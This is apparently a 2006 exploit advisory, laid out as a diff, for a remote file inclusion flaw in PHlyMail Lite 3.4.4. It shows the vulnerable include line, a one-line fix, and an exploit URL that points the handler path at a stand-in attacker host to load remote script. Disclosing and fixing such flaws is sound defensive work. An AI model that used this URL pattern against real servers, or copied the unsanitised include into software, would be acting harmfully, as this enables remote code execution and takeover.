@@ -1,0 +1,90 @@
+/*
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+-   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+- PHlyMail Lite <= 3.4.4 (Build 3.04.04) [_PM_[path][handler]] Remote File Include Vulnerability
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+- [Script name: PHlyMail Lite v. 3.4.4 (Build 3.04.04)
+- [Script site: http://phlymail.de/
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+-          Find by: Kacper (a.k.a Rahim)
++
+-          Contact: kacper1964@yahoo.pl
+-                        or
+-          http://www.devilteam.yum.pl/
+-                       and
+-           http://www.rahim.webd.pl/
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+- Special Greetz: DragonHeart ;-)
+- Ema: Leito, Adam, DeathSpeed, Drzewko, pepi
+-
+!@ Przyjazni nie da sie zamienic na marne kozysci @!
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
++
+-            Z Dedykacja dla osoby,
+-         bez ktorej nie mogl bym zyc...
+-           K.C:* J.M (a.k.a Magaja)
++
++~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+*/
+/*
++++++++++++++++++++++START+++++++++++++++++++++++
+vulnerable code => handlers/email/mod.listmail.php line 12-25:
+....
+$use_preview = (isset($_PM_['core']['folders_usepreview']) && $_PM_['core']['folders_usepreview']) ? true : false;
+
+$ordfields = array
+       ('hfrom', 'hto', 'hcc', 'hbcc', 'hsubject', 'hdate_recv', 'hdate_sent', 'hsize', 'hpriority'
+       ,'attachments', 'meta_read', 'meta_type', 'meta_colour'
+       );
+require_once($_PM_['path']['handler'].'/'.$_REQUEST['handler'].'/fs.php');
+require_once($_PM_['path']['lib'].'/phm_streaming_mailparser.php');
+
+// We changed the folder, got to reset the page number to 0
+if (isset($_REQUEST['workfolder']) && isset($_SESSION['workfolder'])
+       && $_REQUEST['workfolder'] != $_SESSION['workfolder']) {
+   $_SESSION['WPs_pagenum'] = 0;
+}
+....
++++++++++++++++++++++++++++++++++++++++++++++++++
+*/
+/*
++++++++++++++++++++++FIX+++++++++++++++++++++++++
+handlers/email/mod.listmail.php line 12-25:
+Add Line1:
+....
+if (!defined('_IN_PHM_')) die();
+....
+$use_preview = (isset($_PM_['core']['folders_usepreview']) &&
+$_PM_['core']['folders_usepreview']) ? true : false;
+
+$ordfields = array
+       ('hfrom', 'hto', 'hcc', 'hbcc', 'hsubject', 'hdate_recv', 'hdate_sent', 'hsize', 'hpriority'
+       ,'attachments', 'meta_read', 'meta_type', 'meta_colour'
+       );
+require_once($_PM_['path']['handler'].'/'.$_REQUEST['handler'].'/fs.php');
+require_once($_PM_['path']['lib'].'/phm_streaming_mailparser.php');
+
+// We changed the folder, got to reset the page number to 0
+if (isset($_REQUEST['workfolder']) && isset($_SESSION['workfolder'])
+       && $_REQUEST['workfolder'] != $_SESSION['workfolder']) {
+   $_SESSION['WPs_pagenum'] = 0;
+}
+....
+++++++++++++++++++++THE+END++++++++++++++++++++++
+*/
+#Exploit:
+
+http://www.site.com/[phlymail_path]/handlers/email/mod.listmail.php?_PM_[path][handler]=[http://www.myevilsite.com/evil_scripts.txt]
+
+# milw0rm.com [2006-08-18]
